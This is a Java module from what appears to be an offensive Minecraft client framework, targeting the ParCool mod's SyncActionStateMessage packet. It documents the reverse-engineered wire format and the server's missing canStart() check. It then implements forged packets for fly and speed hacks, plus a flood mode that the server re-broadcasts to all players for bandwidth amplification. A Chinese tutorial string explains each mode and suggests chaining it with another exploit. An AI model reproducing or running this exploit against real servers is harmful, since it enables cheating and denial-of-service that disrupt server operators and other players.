package com.redblue.red.modules.parcool;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * PCOOL-02: Unchecked Action Start/Stop + Broadcast Amplification.
 *
 * SyncActionStateMessage (index 15) carries action state from client.
 * Server handler never calls canStart(), passes stamina=null to action.start(),
 * and re-broadcasts to ALL players via PacketDistributor.ALL.
 *
 * Wire format (confirmed via javap):
 *   writeByte(15)              -- discriminator
 *   writeLong(uuidMost)        -- senderUUID
 *   writeLong(uuidLeast)
 *   writeInt(bufferLength)     -- length of inner buffer
 *   writeBytes(buffer)         -- inner buffer
 *
 * Inner buffer format (repeating entries):
 *   putShort(actionID)         -- index in ActionList (0-26)
 *   put(dataTypeCode)          -- 0=Normal, 1=Start, 2=Finish
 *   putInt(dataSize)           -- size of action-specific data
 *   put(actionData[dataSize])  -- action-specific bytes
 *
 * Action IDs (confirmed from ActionList static init):
 *   0=BreakfallReady, 1=CatLeap, 9=Dodge, 10=FastRun,
 *   11=FastSwim, 12=Flipping, 22=Vault, 24=WallJump, etc.
 *
 * Decoder has a 1024-byte limit per action entry (getItem checks size > 1024),
 * but the outer buffer allocation in decode() has NO size limit (PCOOL-04).
 */
public class PCOOL02_ActionSpoof implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("parcool", "message");
    private static final int IDX_SYNC_ACTION_STATE = 15;

    // DataType codes (confirmed from enum bytecode)
    private static final byte DATA_TYPE_NORMAL = 0;
    private static final byte DATA_TYPE_START = 1;
    private static final byte DATA_TYPE_FINISH = 2;

    private long lastTick = 0;

    private final List<ConfigParam> params = List.of(
            ConfigParam.ofBool("enabled", "启用", false),
            ConfigParam.ofEnum("mode", "攻击模式", "FLY_HACK",
                    "FLY_HACK", "SPEED_HACK", "FLOOD"),
            ConfigParam.ofInt("action_id", "动作ID", 24, 0, 26)
                    .visibleWhen("mode", "FLY_HACK", "SPEED_HACK"),
            ConfigParam.ofInt("interval", "发包间隔(tick)", 1, 1, 200)
                    .visibleWhen("mode", "FLY_HACK", "SPEED_HACK"),
            ConfigParam.ofInt("flood_count", "洪泛包数/tick", 10, 1, 50)
                    .visibleWhen("mode", "FLOOD"),
            ConfigParam.ofInt("actions_per_packet", "每包动作数", 5, 1, 20)
                    .visibleWhen("mode", "FLOOD")
    );

    @Override public String id() { return "pcool02_action_spoof"; }
    @Override public String name() { return "动作欺骗"; }
    @Override public String description() { return "伪造跑酷动作触发，实现飞行/加速/洪泛攻击"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
                + "选择攻击模式后启用模块\n\n"
                + "[模式说明]\n"
                + "FLY_HACK: 持续发送 WallJump(24)/CatLeap(1) Start 事件\n"
                + "  服务端不校验 canStart()，直接触发速度修改\n"
                + "  配合 PCOOL-01 无限体力效果更佳\n\n"
                + "SPEED_HACK: 持续发送 FastRun(10) Start 事件\n"
                + "  服务端 onServerTick 会应用 speedModifier 属性修改\n\n"
                + "FLOOD: 每 tick 发送大量动作包\n"
                + "  服务端对每个包都 broadcast 给所有玩家\n"
                + "  N 个包 * M 个玩家 = 带宽放大攻击\n\n"
                + "[动作ID参考]\n"
                + "1=CatLeap 9=Dodge 10=FastRun 11=FastSwim\n"
                + "12=Flipping 22=Vault 24=WallJump 25=WallSlide";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("parcool");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        String mode = getParam("mode").map(ConfigParam::getString).orElse("FLY_HACK");
        switch (mode) {
            case "FLOOD" -> executeFlood(mc);
            default -> sendActionStart(mc);
        }
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        String mode = getParam("mode").map(ConfigParam::getString).orElse("FLY_HACK");

        if ("FLOOD".equals(mode)) {
            executeFlood(mc);
            return;
        }

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(1);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        sendActionStart(mc);
    }

    private void sendActionStart(Minecraft mc) {
        int actionId = getParam("action_id").map(ConfigParam::getInt).orElse(24);

        // Build inner buffer: one Start entry with 0 bytes of action data
        byte[] innerBuf = buildActionEntry((short) actionId, DATA_TYPE_START, new byte[0]);

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_SYNC_ACTION_STATE);
            buf.writeLong(mc.player.getUUID().getMostSignificantBits());
            buf.writeLong(mc.player.getUUID().getLeastSignificantBits());
            buf.writeInt(innerBuf.length);
            buf.writeBytes(innerBuf);
        });
    }

    private void executeFlood(Minecraft mc) {
        int count = getParam("flood_count").map(ConfigParam::getInt).orElse(10);
        int actionsPerPacket = getParam("actions_per_packet").map(ConfigParam::getInt).orElse(5);

        // Build inner buffer with multiple action entries per packet
        byte[] innerBuf = buildMultiActionEntries(actionsPerPacket);

        for (int i = 0; i < count; i++) {
            PacketForge.send(CHANNEL, buf -> {
                buf.writeByte(IDX_SYNC_ACTION_STATE);
                buf.writeLong(mc.player.getUUID().getMostSignificantBits());
                buf.writeLong(mc.player.getUUID().getLeastSignificantBits());
                buf.writeInt(innerBuf.length);
                buf.writeBytes(innerBuf);
            });
        }
    }

    /**
     * Build a single action entry for the inner buffer.
     * Format: Short(actionID) + Byte(dataType) + Int(dataSize) + Bytes(data)
     */
    private byte[] buildActionEntry(short actionId, byte dataType, byte[] data) {
        // 2 (short) + 1 (byte) + 4 (int) + data.length
        byte[] result = new byte[7 + data.length];
        java.nio.ByteBuffer bb = java.nio.ByteBuffer.wrap(result);
        bb.putShort(actionId);
        bb.put(dataType);
        bb.putInt(data.length);
        if (data.length > 0) bb.put(data);
        return result;
    }

    /**
     * Build multiple action entries cycling through various actions.
     * Each entry is a Start with 0 data bytes.
     */
    private byte[] buildMultiActionEntries(int count) {
        short[] actionIds = {1, 9, 10, 12, 22, 24}; // CatLeap, Dodge, FastRun, Flipping, Vault, WallJump
        int entrySize = 7; // 2+1+4+0
        byte[] result = new byte[entrySize * count];
        java.nio.ByteBuffer bb = java.nio.ByteBuffer.wrap(result);
        for (int i = 0; i < count; i++) {
            bb.putShort(actionIds[i % actionIds.length]);
            bb.put(DATA_TYPE_START);
            bb.putInt(0);
        }
        return result;
    }
}
